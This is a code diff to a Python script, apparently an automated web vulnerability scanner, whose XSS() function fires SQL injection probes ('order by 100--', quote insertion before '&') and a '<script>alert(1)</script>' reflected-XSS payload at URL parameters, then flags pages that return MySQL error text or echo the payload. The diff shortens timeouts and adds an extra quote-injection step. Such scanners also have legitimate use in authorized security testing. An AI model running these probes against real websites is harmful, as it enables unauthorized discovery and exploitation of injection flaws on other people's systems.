@@ -1,3 +1,4 @@
+from dataclasses import replace
 import requests
 import sys
 import os, shutil
@@ -142,19 +143,29 @@ def XSS():
                     if sqli==1:
                         k=f"{i}+order+by+100--"
                         l=f"{i}'+order+by+100--+-"
-                        reqq = requests.get(k, 'html.parser',timeout=3).text
+                        reqq = requests.get(k, 'html.parser',timeout=2).text
                         req= reqq.lower()
                         if 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
                             pass
                         else:
-                            reqq = requests.get(l, 'html.parser',timeout=3).text
+                            reqq = requests.get(l, 'html.parser',timeout=2).text
                             req= reqq.lower()
+                            if 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
+                                pass
+                            else:
+                                if '&' in str(i):
+                                    j = i.replace('&',"'&")
+                                    reqq = requests.get(j, 'html.parser',timeout=1).text
+                                    req= reqq.lower()
+                                    i=j
+                                else:
+                                    pass
                     elif xss==1:
                         j = i.replace('=','=<script>alert(1)</script>')
-                        req = requests.get(j, 'html.parser',timeout=3).text
+                        req = requests.get(j, 'html.parser',timeout=2).text
                         i=j
                     else:
-                        req = requests.get(i, 'html.parser',timeout=3).text
+                        req = requests.get(i, 'html.parser',timeout=2).text
                 except:
                     to = 1
                 if "alert(1)" in str(req):
@@ -182,19 +193,29 @@ def XSS():
                     if sqli==1:
                         k=f"{i}+order+by+100--"
                         l=f"{i}'+order+by+100--+-"
-                        reqq = requests.get(k, 'html.parser',timeout=3).text
+                        reqq = requests.get(k, 'html.parser',timeout=2).text
                         req= reqq.lower()
                         if 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
                             pass
                         else:
-                            reqq = requests.get(l, 'html.parser',timeout=3).text
+                            reqq = requests.get(l, 'html.parser',timeout=2).text
                             req= reqq.lower()
+                            if 'unknown' in str(req) or 'column' in str(req) or 'mysql_fetch' in str(req) or 'mysqli' in str(req) or 'on line' in str(req) or 'at line' in str(req):
+                                pass
+                            else:
+                                if '&' in str(i):
+                                    j = i.replace('&',"'&")
+                                    reqq = requests.get(j, 'html.parser',timeout=1).text
+                                    req= reqq.lower()
+                                    i=j
+                                else:
+                                    pass
                     elif xss==1:
                         j = i.replace('=','=<script>alert(1)</script>')
-                        req = requests.get(j, 'html.parser',timeout=3).text
+                        req = requests.get(j, 'html.parser',timeout=2).text
                         i=j
                     else:
-                        req = requests.get(i, 'html.parser',timeout=3).text
+                        req = requests.get(i, 'html.parser',timeout=2).text
                 except:
                     to = 1
                 if "alert(1)" in str(req):
